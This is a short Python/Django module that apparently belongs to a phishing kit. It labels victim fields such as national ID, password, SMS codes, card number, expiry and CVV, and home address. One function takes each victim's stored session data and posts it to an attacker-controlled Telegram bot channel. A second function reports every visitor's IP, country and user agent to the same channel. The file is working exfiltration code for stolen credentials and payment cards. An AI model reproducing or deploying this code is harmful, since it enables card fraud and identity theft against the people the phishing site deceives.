import datetime
import os

import requests
from django.conf import settings
from loguru import logger


fields = {
    'siffer': '🆔',
    'full_name': '🎭',
    'phone': '📞',
    'birthday': '📅',
    'password': '📲',
    'sms': '📲',
    'allowed': '✅',
    'user': '🆔',
    'cart_name_holder': '🤠',
    'CC': '‼️',
    'exp': '‼️',
    'CVV': '‼️',
    'code': '📲',
    'address': '📍',
    'city': '📍',
    'postal': '📍',
}


def send_message(session):
    message = '######################\n' \
              '‼️‼️‼️‼️ BANANA_NO ‼️‼️‼️‼️\n' \
              '######################\n\n'

    if session.__dict__.get('_session_cache'):
        for field in session.__dict__.get('_session_cache'):
            if str(session.__dict__.get('_session_cache')[field]):
                i = '' if fields.get(field) is None else fields.get(field)
                message += i + ' ' + str(field).replace('_', ' ') + ' : ' + str(
                    session.__dict__.get('_session_cache')[field]) + '   ' + i + '\n'

    message += f' date time : {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'

    if not settings.DEBUG:
        try:
            api_url = f"https://api.telegram.org/bot{os.getenv('bot_token')}/sendMessage"
            requests.post(api_url, json={'chat_id': os.getenv('channel_name'), 'text': message})
        except Exception as e:
            logger.error(e)
    else:
        logger.success(message)

def new_visit(agent, location, ip):
        message = '######### NEW VISIT ######\n' \
                  f'{agent} || {location["country"]} || {ip}\n' \
                  '######################\n\n'
        if not settings.DEBUG:
            api_url = f"https://api.telegram.org/bot{os.getenv('bot_token')}/sendMessage"
            requests.post(api_url, json={'chat_id': os.getenv('channel_name'), 'text': message})
        else:
            logger.success(message)
